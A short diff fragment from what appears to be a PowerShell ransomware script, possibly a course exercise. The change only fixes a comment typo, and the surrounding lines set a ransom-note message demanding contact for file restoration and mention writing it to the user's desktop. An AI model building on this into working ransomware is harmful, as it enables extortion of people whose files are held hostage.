@@ -15,7 +15,7 @@ if (Test-Path -Path $dest -PathType Leaf) {
 }
 
 
-# Uur ransom note
+# Our ransom note
 $note = "If you want your files restored, please contact me at dunston@champlain.edu. I look forward to doing business with you."
 
 # Write the Ransom Note to the users desktop
